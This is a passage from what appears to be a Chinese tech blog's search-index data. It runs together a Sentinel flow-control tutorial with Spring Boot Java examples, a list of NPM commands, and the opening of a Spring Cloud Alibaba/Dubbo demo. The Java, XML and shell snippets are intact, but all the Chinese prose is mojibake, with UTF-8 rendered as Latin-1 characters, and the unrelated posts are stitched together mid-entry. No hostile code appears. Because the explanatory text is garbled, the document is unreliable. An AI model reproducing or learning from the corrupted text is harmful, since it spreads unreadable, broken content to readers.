ã€‚ä½¿ç”¨ Sentinel æ¥è¿›è¡Œèµ„æºä¿æŠ¤ï¼Œä¸»è¦åˆ†ä¸ºä¸¤ä¸ªæ­¥éª¤ï¼ŒåŒ…æ‹¬å®šä¹‰èµ„æºå’Œå®šä¹‰è§„åˆ™ã€‚å…ˆæŠŠå¯èƒ½éœ€è¦ä¿æŠ¤çš„èµ„æºå®šä¹‰å¥½ï¼Œä¹‹åå†é…ç½®è§„åˆ™ã€‚åœ¨ç¼–ç çš„æ—¶å€™ï¼Œåªéœ€è¦è€ƒè™‘è¿™ä¸ªä»£ç æ˜¯å¦éœ€è¦ä¿æŠ¤ï¼Œå¦‚æœéœ€è¦ä¿æŠ¤ï¼Œå°±å¯ä»¥å°†ä¹‹å®šä¹‰ä¸ºä¸€ä¸ªèµ„æºã€‚ Sentinel é™¤äº†åŸºæœ¬çš„å®šä¹‰èµ„æºçš„æ–¹å¼ä¹‹å¤–ï¼Œè¿˜æœ‰å…¶ä»–å®šä¹‰èµ„æºçš„æ–¹å¼ï¼Œå…·ä½“å¦‚ä¸‹ï¼š æŠ›å‡ºå¼‚å¸¸çš„æ–¹å¼å®šä¹‰èµ„æº è¿”å›å¸ƒå°”å€¼æ–¹å¼å®šä¹‰èµ„æº å¼‚æ­¥è°ƒç”¨æ”¯æŒ æ³¨è§£æ–¹å¼å®šä¹‰èµ„æº ä¸»æµæ¡†æ¶çš„é»˜è®¤é€‚é… ç‰ˆæœ¬å£°æ˜æœ¬æ¡ˆä¾‹ä½¿ç”¨çš„ Spring Boot ç‰ˆæœ¬ä¸º 2.1.4.RELEASEï¼ŒSpring Cloud Alibaba Sentinel ç‰ˆæœ¬ä¸º 2.1.3.RELEASEï¼ŒSentinel 1.8.0ã€‚ä»¥ä¸‹ä»£ç ï¼Œé»˜è®¤éƒ½é€šè¿‡ Sentinel æ§åˆ¶å°åŠ¨æ€é…ç½®æµæ§è§„åˆ™æ¥æµ‹è¯•ï¼Œå…·ä½“ä¸å†ç´¯è¿°ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ æ·»åŠ  Maven ä¾èµ–1234567891011121314151617181920212223242526&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.4.RELEASE&lt;/version&gt; &lt;relativePath/&gt;&lt;/parent&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;spring-cloud-starter-sentinel&gt;2.1.3.RELEASE&lt;/spring-cloud-starter-sentinel&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-starter-sentinel}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; å¦‚æœä¸éœ€è¦ä½¿ç”¨æ³¨è§£çš„æ–¹å¼æ¥å®šä¹‰ Sentinel èµ„æºï¼Œä¸€èˆ¬åªéœ€è¦å¼•å…¥ä»¥ä¸‹ä¸¤ä¸ªä¾èµ–å³å¯ï¼Œæ­¤æ—¶å¯åŠ¨åº”ç”¨æ—¶éœ€è¦æ·»åŠ  JVM å‚æ•°æ¥è¿æ¥ Sentinel æ§åˆ¶å°ã€‚å¦åˆ™éœ€è¦å¼•å…¥ spring-cloud-starter-alibaba-sentinel ä¾èµ–ï¼Œæ‰èƒ½è®© @SentinelResource æ³¨è§£ç”Ÿæ•ˆã€‚ 123456789101112&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-core&lt;/artifactId&gt; &lt;version&gt;1.8.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-transport-simple-http&lt;/artifactId&gt; &lt;version&gt;1.8.0&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; é…ç½® application.yml12345678910server: port: 8080spring: application: name: sentinel-resource-define-demo cloud: sentinel: transport: dashboard: 127.0.0.1:9000 æŠ›å‡ºå¼‚å¸¸çš„æ–¹å¼å®šä¹‰èµ„æºSentinel çš„ SphU åŒ…å«äº† try-catch é£æ ¼çš„ APIã€‚ç”¨è¿™ç§æ–¹å¼ï¼Œå½“èµ„æºå‘ç”Ÿäº†é™æµä¹‹åå°±ä¼šæŠ›å‡º BlockException å¼‚å¸¸ã€‚è¿™ä¸ªæ—¶å€™å¯ä»¥æ•è·å¼‚å¸¸ï¼Œè¿›è¡Œé™æµä¹‹åçš„é€»è¾‘å¤„ç†ï¼Œè€Œåœ¨ä¸Šè¿°çš„å…¥é—¨æ¡ˆä¾‹ä¸­å°±ä½¿ç”¨äº†æ­¤ç§æ–¹å¼è¿›è¡Œå®šä¹‰èµ„æºï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021@RestControllerpublic class TestController { /** * èµ„æºåç§° */ private static final String RESOURCE_NAME = "Hello"; @GetMapping("/hello") public String hello() { // ä½¿ç”¨æµæ§è§„åˆ™ try (Entry entry = SphU.entry(RESOURCE_NAME)) { // è¢«ä¿æŠ¤çš„èµ„æº return "Hello Sentinel!"; } catch (Exception e) { // è¢«é™æµ e.printStackTrace(); return "ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å ..."; } }} è¿”å›å¸ƒå°”å€¼æ–¹å¼å®šä¹‰èµ„æºSentinel çš„ SphO æä¾› if-else é£æ ¼çš„ APIï¼Œç”¨è¿™ç§æ–¹å¼ï¼Œå½“èµ„æºå‘ç”Ÿäº†é™æµä¹‹åå°±ä¼šè¿”å› falseï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥æ ¹æ®è¿”å›å€¼ï¼Œè¿›è¡Œé™æµä¹‹åçš„é€»è¾‘å¤„ç†ã€‚ 123456789101112131415161718192021222324252627@RestControllerpublic class TestBooleanController { /** * èµ„æºåç§° */ private static final String RESOURCE_NAME = "Boolean"; @GetMapping("/boolean") public boolean hello() { // ä½¿ç”¨æµæ§è§„åˆ™ if (SphO.entry(RESOURCE_NAME)) { // è¢«ä¿æŠ¤çš„èµ„æº try { System.out.println("Hello Sentinel!"); return true; } finally { // é™æµçš„å‡ºå£ SphO.exit(); } } else { // è¢«é™æµ System.out.println("ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å ..."); return false; } }} ç‰¹åˆ«æ³¨æ„ï¼šSphO.entry() éœ€è¦ä¸ SphO.exit() æ–¹æ³•æˆå¯¹å‡ºç°ï¼Œå¦åˆ™ä¼šå¯¼è‡´è°ƒç”¨é“¾è®°å½•å¼‚å¸¸ï¼ŒæŠ›å‡º ErrorEntryFreeException å¼‚å¸¸ã€‚ å¼‚æ­¥è°ƒç”¨æ–¹å¼å®šä¹‰èµ„æºSentinel æ”¯æŒå¼‚æ­¥è°ƒç”¨é“¾è·¯çš„ç»Ÿè®¡ï¼Œåœ¨å¼‚æ­¥è°ƒç”¨ä¸­ï¼Œéœ€è¦é€šè¿‡ SphU.asyncEntry() æ–¹æ³•å®šä¹‰èµ„æºï¼Œå¹¶åœ¨éœ€è¦å¼‚æ­¥çš„å›è°ƒå‡½æ•°ä¸­è°ƒç”¨ exit() æ–¹æ³•ã€‚ 1234567891011/** * @EnableAsync å¯ç”¨Springçš„å¼‚æ­¥è°ƒç”¨æ”¯æŒ */@SpringBootApplication@EnableAsyncpublic class SentinelApplication { public static void main(String[] args) { SpringApplication.run(SentinelApplication.class, args); }} 1234567891011121314151617@Servicepublic class AsyncService { /** * @Async è¡¨ç¤ºå¼‚æ­¥è°ƒç”¨æ–¹æ³• */ @Async public void hello() { System.out.println("start async method ..."); try { Thread.sleep(5000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println("end async method ..."); }} 12345678910111213141516171819202122232425262728@RestControllerpublic class TestAsyncController { private static final String RESOURCE_NAME = "Async"; @Autowired private AsyncService asyncService; @GetMapping("/async") public void hello() { AsyncEntry asyncEntry = null; try { // ä½¿ç”¨æµæ§è§„åˆ™ asyncEntry = SphU.asyncEntry(RESOURCE_NAME); // è¢«ä¿æŠ¤çš„èµ„æº asyncService.hello(); } catch (BlockException e) { // è¢«é™æµ e.printStackTrace(); System.out.println("ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å ..."); } finally { if (asyncEntry != null) { // é™æµçš„å‡ºå£ asyncEntry.exit(); } } }} æ³¨è§£æ–¹å¼å®šä¹‰èµ„æº é€šè¿‡ @SentinelResource æ³¨è§£çš„ blockHandler å±æ€§åˆ¶å®šå…·ä½“çš„é™æµå¤„ç†æ–¹æ³• å®ç°å¤„ç†æ–¹æ³•ï¼Œè¯¥æ–¹æ³•çš„ä¼ å‚å¿…é¡»ä¸èµ„æºç‚¹çš„ä¼ å‚ä¸€æ ·ï¼Œå¹¶ä¸”æœ€åå¿…é¡»åŠ ä¸Š BlockException å¼‚å¸¸å‚æ•°ï¼ŒåŒæ—¶è¿”å›ç±»å‹ä¹Ÿå¿…é¡»ä¸€æ · ä» 1.4.0 ç‰ˆæœ¬å¼€å§‹ï¼Œä½¿ç”¨æ³¨è§£çš„æ–¹å¼å®šä¹‰èµ„æºï¼Œé»˜è®¤æ”¯æŒè‡ªåŠ¨ç»Ÿè®¡ä¸šåŠ¡å¼‚å¸¸ï¼Œæ— éœ€å†æ‰‹åŠ¨è°ƒç”¨ Tracer.trace(ex) æ¥è®°å½•ä¸šåŠ¡å¼‚å¸¸ æ›´å¤šæ³¨è§£å±æ€§è¯´æ˜ï¼Œå¯ä»¥çœ‹è¿™é‡Œ 1234567891011121314151617181920212223242526272829303132@RestControllerpublic class TestAnnotationController { /** * èµ„æºåç§° */ private static final String RESOURCE_NAME = "Annotation"; /** * @return * @SentinelResource å®šä¹‰èµ„æº * valueï¼šèµ„æºåç§° * blockHandlerï¼šé™æµå¤„ç†çš„æ–¹æ³• */ @SentinelResource(value = RESOURCE_NAME, blockHandler = "exceptionHandler") @GetMapping("/annotation") public String hello() { // è¢«ä¿æŠ¤çš„èµ„æº return "Hello Sentinel!"; } /** * åŸæ–¹æ³•è¢«é™æµçš„æ—¶å€™è°ƒç”¨æ­¤æ–¹æ³• * * @param e * @return */ public String exceptionHandler(BlockException e) { e.printStackTrace(); return "ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å€™ ..."; }} ä¸‹ç¯‡ - Sentinel å…¥é—¨æ•™ç¨‹ï¼ˆä¸­çº§ç¯‡ï¼‰ Sentinel å…¥é—¨æ•™ç¨‹ - ä¸­çº§ç¯‡ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"NPM å¸¸ç”¨å‘½ä»¤ä»‹ç»",url:"/posts/f93d57c7.html",text:'æ¨¡å—ç®¡ç†NPM å®‰è£…ä¸å¸è½½æ¨¡å—1234567891011121314151617# å…¨å±€å®‰è£…$ npm install xxxx -g# å±€éƒ¨å®‰è£…ï¼Œä¸”æ›´æ–°package.jsonæ–‡ä»¶$ npm install xxxx --save# å¸è½½æŒ‡å®šæ¨¡å—$ npm uninstall xxxx# å¸è½½å…¨å±€æ¨¡å—$ npm uninstall xxxx -g# æŸ¥çœ‹æ¨¡å—çš„æœ€æ–°ç‰ˆæœ¬å·$ npm view xxxx version# æŸ¥çœ‹æ¨¡å—çš„æ‰€æœ‰ç‰ˆæœ¬å·$ npm view xxxx versions NPM æ£€æŸ¥æ¨¡å—æ›´æ–°1234567891011# å…¨å±€å®‰è£…æ£€æŸ¥æ›´æ–°çš„æ¨¡å—$ npm install npm-check-updates -g# æ£€æŸ¥å¯æ›´æ–°çš„æ¨¡å—$ npm-check-updates# æ›´æ–°æ‰€æœ‰æ¨¡å—ï¼Œä¸”æ›´æ–°package.jsonæ–‡ä»¶ä¸­çš„ä¾èµ–åŒ…åˆ°æœ€æ–°ç‰ˆæœ¬ï¼ˆä¼ä¸šé¡¹ç›®å¼€å‘åˆ‡å¿Œä¸€æ¬¡æ€§å…¨éƒ¨æ›´æ–°ï¼‰$ npm-check-updates -u# æ›´æ–°æŒ‡å®šçš„æ¨¡å—ï¼Œä¸”æ›´æ–°package.jsonæ–‡ä»¶ï¼ˆä¸æ¨¡å—çš„å®‰è£…æ“ä½œæ²¡æœ‰æœ¬è´¨åŒºåˆ«ï¼Œåªæ˜¯æŒ‡å®šäº†æ–°çš„ç‰ˆæœ¬å·ï¼‰ï¼Œå¦‚æœæ‰§è¡Œå¤±è´¥å¯å°è¯•åˆ é™¤package-lock.jsonæ–‡ä»¶åå†æ›´æ–°$ npm install xxxx@0.1.9 --save NPM æŸ¥çœ‹å·²å®‰è£…çš„æ¨¡å—æŸ¥çœ‹å±€éƒ¨å·²å®‰è£…çš„æ¨¡å—ï¼Œ--depth å‚æ•°è¡¨ç¤ºæ·±åº¦ 1$ npm list --depth 0 æŸ¥çœ‹å…¨å±€å·²å®‰è£…çš„æ¨¡å—ï¼Œ--depth å‚æ•°è¡¨ç¤ºæ·±åº¦ 1$ npm list -g --depth 0 ä»£ç†è®¾ç½®NPM è®¾ç½®ä»£ç†12345678910# è®¾ç½®ä»£ç†ä¸ä»“åº“æº$ npm config set proxy=http://127.0.0.1:1080$ npm config set registry=http://registry.npmjs.org# å…³äºHttpsï¼Œè‹¥ä¸Šé¢ä½¿ç”¨äº†httpså¼€å¤´çš„ä»“åº“æºï¼Œæ­¤æ—¶éœ€è¦é¢å¤–è®¾ç½®https_proxyå‚æ•°ï¼Œååˆ™ä¸éœ€è¦è®¾ç½®$ npm config set https-proxy http://127.0.0.1:1080# å–æ¶ˆä»£ç†$ npm config delete proxy$ npm config delete https-proxy æƒé™é…ç½®è§£å†³ NPM å®‰è£…æ¨¡å—çš„æƒé™é—®é¢˜NPM å‡ºäºå®‰å…¨è€ƒè™‘ä¸æ”¯æŒä»¥ root ç”¨æˆ·è¿è¡Œï¼Œå³ä½¿ç”¨ root ç”¨æˆ·èº«ä»½è¿è¡Œäº†ï¼ŒNPM ä¼šè‡ªåŠ¨è½¬æˆä¸€ä¸ªå« nobody çš„ç”¨æˆ·æ¥è¿è¡Œï¼Œè€Œè¿™ä¸ªç”¨æˆ·å‡ ä¹æ²¡æœ‰ä»»ä½•æƒé™ã€‚è¿™æ ·çš„è¯å¦‚æœè„šæœ¬é‡Œæœ‰ä¸€äº›éœ€è¦æƒé™çš„æ“ä½œï¼Œæ¯”å¦‚å†™æ–‡ä»¶ï¼ˆå°¤å…¶æ˜¯å†™ /root/.node-gypï¼‰ï¼Œç¨‹åºå°±ä¼šå´©æ‰ã€‚ä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼Œè¦ä¹ˆæŒ‰ç…§ NPM çš„è§„çŸ©æ¥ï¼Œä¸“é—¨å»ºä¸€ä¸ªç”¨äºè¿è¡Œ npm å‘½ä»¤çš„é«˜æƒé™ç”¨æˆ·ï¼›è¦ä¹ˆåŠ  --unsafe-perm å‚æ•°ï¼Œè¿™æ ·å°±ä¸ä¼šåˆ‡æ¢åˆ° nobody ç”¨æˆ·ä¸Šï¼Œè¿è¡Œæ—¶æ˜¯å“ªä¸ªç”¨æˆ·å°±æ˜¯å“ªä¸ªç”¨æˆ·ï¼Œå³ä½¿æ˜¯ root ç”¨æˆ·ã€‚ 1$ npm install --unsafe-perm=true --allow-root NPM é•œåƒåŠ é€Ÿåœ¨ä½¿ç”¨ NPM çš„è¿‡ç¨‹ä¸­ç»å¸¸ä¼šé‡åˆ°æ— æ³•ä¸‹è½½åŒ…çš„é—®é¢˜ï¼Œè¿™é‡Œæ•´ç†äº†å‡ ç§ NPM ä½¿ç”¨å›½å†…é•œåƒåŠ é€Ÿçš„æ–¹æ³•ã€‚ æ·˜å®é•œåƒæº12345# é…ç½®æ·˜å®é•œåƒæº$ npm config set registry https://registry.npm.taobao.org# éªŒè¯é…ç½®æ˜¯å¦ç”Ÿæ•ˆ$ npm config get registry åä¸ºäº‘é•œåƒæº12345# é…ç½®åä¸ºé•œåƒæº$ npm config set registry https://mirrors.huaweicloud.com/repository/npm/# éªŒè¯é…ç½®æ˜¯å¦ç”Ÿæ•ˆ$ npm config get registry ä½¿ç”¨ CNPM æ›¿ä»£ NPM12345# å…¨å±€å®‰è£…CNPM# npm install -g cnpm --registry=https://registry.npm.taobao.org# å®‰è£…æ¨¡å—$ cnpm install xxx var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å‰ç«¯"},{title:"Spring Cloud Alibaba ç»¼åˆé›†æˆæ¶æ„æ¼”ç¤ºæ¡ˆä¾‹",url:"/posts/7f5a87b2.html",text:'å‰è¨€Spring Cloud æ˜¯ä¸€å¥—è¾ƒä¸ºå…¨é¢çš„å¾®æœåŠ¡æ¡†æ¶é›†ï¼Œé›†æˆäº†å¦‚æœåŠ¡æ³¨å†Œå‘ç°ã€é…ç½®ä¸­å¿ƒã€æ¶ˆæ¯æ€»çº¿ã€è´Ÿè½½å‡è¡¡ã€æ–­è·¯å™¨ã€API ç½‘å…³ç­‰åŠŸèƒ½å®ç°ã€‚è€Œåœ¨ç½‘ä¸Šç»å¸¸ä¼šå‘ç° Spring Cloud ä¸é˜¿é‡Œå·´å·´çš„ Dubbo è¿›è¡Œé€‰æ‹©å¯¹æ¯”ï¼Œè¿™æ ·åšå…¶å®ä¸æ˜¯å¾ˆå¦¥å½“ï¼Œå‰è€…æ˜¯ä¸€å¥—è¾ƒä¸ºå®Œæ•´çš„å¾®æœåŠ¡æ¶æ„æ–¹æ¡ˆï¼Œè€Œ Dubbo åªæ˜¯æœåŠ¡æ²»ç†ä¸ RPC å®ç°æ–¹æ¡ˆã€‚Dubbo åœ¨å›½å†…æœ‰ç€éå¸¸å¤§çš„ç”¨æˆ·ç¾¤ä½“ï¼Œä½†æ˜¯å…¶å‘¨è¾¹è®¾æ–½ä¸ç»„ä»¶ç›¸å¯¹æ¥è¯´å¹¶ä¸é‚£ä¹ˆå®Œå–„ã€‚å¾ˆå¤šå¼€å‘è€…ç”¨æˆ·åˆå¾ˆå¸Œæœ›äº«å— Spring Cloud çš„ç”Ÿæ€ï¼Œå› æ­¤ä¹Ÿä¼šæœ‰ä¸€äº› Spring Cloud ä¸ Dubbo ä¸€èµ·ä½¿ç”¨çš„æ¡ˆä¾‹ä¸æ–¹æ³•å‡ºç°ï¼Œä½†æ˜¯ä¸€ç›´ä»¥æ¥å¤§éƒ¨åˆ† Spring Cloud æ•´åˆ Dubbo çš„ä½¿ç”¨æ–¹æ¡ˆéƒ½ä¸å®Œå–„ï¼Œç›´åˆ° Spring Cloud Alibaba çš„å‡ºç°ï¼Œæ‰å¾—ä»¥è§£å†³è¿™æ ·çš„é—®é¢˜ã€‚ é—®é¢˜å»¶ä¼¸ç”±äº Feign æ˜¯åŸºäº HTTP Restful çš„è°ƒç”¨ï¼Œåœ¨é«˜å¹¶å‘ä¸‹çš„æ€§èƒ½ä¸å¤Ÿç†æƒ³ï¼Œé‚£ä¹ˆ RPC æ–¹æ¡ˆèƒ½å¦åˆ‡æ¢ä¸º Dubboï¼ŸSpring Cloud ä¸é˜¿é‡Œç³»çš„è‹¥å¹²ç»„ä»¶èƒ½å¦å®Œç¾é›†æˆå‘¢ï¼Ÿ æ•´ä½“ç³»ç»Ÿæ¶æ„ç³»ç»Ÿæ¶æ„å›¾ API ç½‘å…³ï¼šç³»ç»Ÿç»Ÿä¸€å…¥å£ï¼Œå±è”½æ¶æ„å†…éƒ¨ç»“æ„ï¼Œç»Ÿä¸€å®‰å…¨æ‹¦æˆªï¼Œé‡‡ç”¨ Zuul å®ç° Application-1ï¼šåº”ç”¨ 1ï¼Œæ¨¡æ‹Ÿåº”ç”¨ï¼Œæä¾› HTTP æ¥å£æœåŠ¡ç»™ API ç½‘å…³è°ƒç”¨ï¼ˆFeignï¼‰ Service-1ï¼šå¾®æœåŠ¡ 1ï¼Œæ¨¡æ‹Ÿå¾®æœåŠ¡ï¼Œæä¾› Dubbo æ¥å£æœåŠ¡ç»™ Application-1 è°ƒç”¨ Service-2ï¼šå¾®æœåŠ¡ 2ï¼Œæ¨¡æ‹Ÿå¾®æœåŠ¡ï¼Œæä¾› Dubbo æ¥å£æœåŠ¡ç»™ Application-1 è°ƒç”¨ æ¶æ„åˆ†å±‚ æ¥å…¥å±‚ï¼šAPI ç½‘å…³ åº”ç”¨å±‚ï¼šApplication-1 å¾®æœåŠ¡å±‚ï¼šService-1ã€Service-2 è°ƒç”¨æµç¨‹ æ‰€æœ‰è®¿é—®ç³»ç»Ÿçš„è¯·æ±‚éƒ½è¦ç»è¿‡ API ç½‘å…³ï¼Œç½‘å…³è½¬å‘ HTTP è¯·æ±‚è‡³ Application-1ï¼Œç„¶å Application-1 ä½¿ç”¨ Dubbo è°ƒç”¨ Service-1 å®Œæˆè‡ªèº«ä¸šåŠ¡ï¼Œæœ€å Sevice-1 ä½¿ç”¨ Dubbo è°ƒç”¨ Service-2 å®Œæˆè‡ªèº«ä¸šåŠ¡ã€‚è‡³æ­¤ï¼Œå®Œæˆæ‰€æœ‰ç»„ä»¶è´¯ç©¿ã€‚ Application ä¸ Sevice çš„åŒºåˆ« å½¢æˆ Service æ”¯æ’‘ Application çš„æ•´ä½“æ¶æ„ï¼Œå¢åŠ å¤šå˜çš„ Application ç”šè‡³ä¸éœ€è¦å˜åŠ¨ Service Service æä¾›äº†åŸºç¡€æœåŠ¡åŠŸèƒ½ï¼Œè€Œ Application ç»„è£…åŸºç¡€æœåŠ¡åŠŸèƒ½ï¼Œæä¾›ç»™ç”¨æˆ·ç›´æ¥å¯ç”¨çš„ä¸šåŠ¡ï¼Œé€‚åˆå¿«é€Ÿè¿­ä»£å¼€å‘ Service æœåŠ¡ç²’åº¦å°ã€åŠŸèƒ½åŸºç¡€ï¼Œä¸æ˜“å‘ç”Ÿæ”¹å˜ï¼Œè€Œ Application æä¾›ä¸Šæ¸¸ä¸šåŠ¡åŠŸèƒ½ï¼Œç´§è´´ä¸šåŠ¡éœ€æ±‚ï¼Œå®¹æ˜“å‘ç”Ÿæ”¹å˜ Spring Cloud Alibaba é›†æˆæ¶æ„æ¼”ç¤ºæ¡ˆä¾‹1.0ã€æŠ€æœ¯é€‰å‹Spring Bootã€Spring Cloud Zuulã€Spring Cloud OpenFeignã€Nacosã€Dubbo 1.1ã€ç‰ˆæœ¬è¯´æ˜ Zuul 1.3.1 Dubbo 2.7.8 Nacos Server 1.4.0 Spring Boot 2.1.18.RELEASE Spring Cloud Greenwich.SR6 Spring Cloud Alibaba Dubbo 2.2.3.RELEASE Spring Cloud Alibaba Nacos Config 2.1.3.RELEASE Spring Cloud Alibaba Nacos Discovery 2.1.3.RELEASE æœ¬æ¡ˆä¾‹ä¸­ä½¿ç”¨çš„å„å¼€æºç»„ä»¶çš„ç‰ˆæœ¬å¦‚ä¸Šï¼Œå…¶ä¸­ Spring Cloud Alibaba Nacos Config å¹¶æ²¡æœ‰çœŸæ­£å‘æŒ¥é…ç½®ä¸­å¿ƒçš„ä½œç”¨ï¼Œå› ä¸ºæœ¬æ–‡ä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºï¼Œå¹¶æ²¡æœ‰å°† bootstrap.yml é…ç½®æ–‡ä»¶é‡Œçš„éƒ¨åˆ†é…ç½®ä¿¡æ¯å‘å¸ƒåˆ° Nacos Serverï¼ˆé…ç½®ä¸­å¿ƒ + æ³¨å†Œä¸­å¿ƒï¼‰ï¼Œå°¤å…¶æ˜¯ api-gateway å·¥ç¨‹é‡Œçš„è·¯ç”±æ˜ å°„é…ç½®ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 1.2ã€å·¥ç¨‹ç»“æ„é‡‡ç”¨ Maven å·¥ç¨‹ç»“æ„ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºï¼Œå„ç»„ä»¶çš„å¼€å‘é¡ºåºä¸ºï¼š service-2 -&gt; service-1 -&gt; application-1 -&gt; api-gateway 123456789alibaba-micro-service-study æ•´ä½“çˆ¶å·¥ç¨‹â”œâ”€â”€ api-gateway API ç½‘å…³ï¼Œç«¯å£ï¼š56010â”œâ”€â”€ application-1 åº”ç”¨ 1ï¼Œç«¯å£ï¼š56020â”œâ”€â”€ service-1 æœåŠ¡ 1 çˆ¶å·¥ç¨‹â”‚&nbsp;&nbsp; â”œâ”€â”€ service-1-api æœåŠ¡ 1 APIâ”‚&nbsp;&nbsp; â”œâ”€â”€ service-1-business æœåŠ¡ 1 ä¸šåŠ¡å®ç°ï¼Œç«¯å£ï¼š56030â””â”€â”€ service-2 æœåŠ¡ 2 çˆ¶å·¥ç¨‹ â”œâ”€â”€ service-2-api æœåŠ¡ 2 API â””â”€â”€ services-2-business æœåŠ¡ 2 ä¸šåŠ¡å®ç°ï¼Œç«¯å£ï¼š56040 1.3ã€åˆ›å»º Maven çˆ¶å·¥ç¨‹åˆ›å»º Maven çˆ¶å·¥ç¨‹ï¼Œé…ç½®å¥½å·¥ç¨‹éœ€è¦çš„çˆ¶çº§ä¾èµ–ï¼Œç›®çš„æ˜¯ä¸ºäº†æ›´æ–¹ä¾¿ç®¡ç†ä¸ç®€åŒ–é…ç½®ï¼Œå…·ä½“é…ç½®å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt;&lt;artifactId&gt;alibaba-micro-service-study&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;pom&lt;/packaging&gt;&lt;modules&gt; &lt;module&gt;api-gateway&lt;/module&gt; &lt;module&gt;application-1&lt;/module&gt; &lt;module&gt;service-1&lt;/module&gt; &lt;module&gt;service-2&lt;/module&gt; &lt;/modules&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt; &lt;/parent&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;spring-cloud.version&gt;Greenwich.SR6&lt;/spring-cloud.version&gt; &lt;spring-cloud-dubbo.version&gt;2.2.3.RELEASE&lt;/spring-cloud-dubbo.version&gt; &lt;spring-cloud-nacos.version&gt;2.1.3.RELEASE&lt;/spring-cloud-nacos.version&gt; &lt;/properties&gt; &lt;!-- ç®¡ç†ä¾èµ– --&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring-cloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-dubbo&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-dubbo.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-nacos.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; 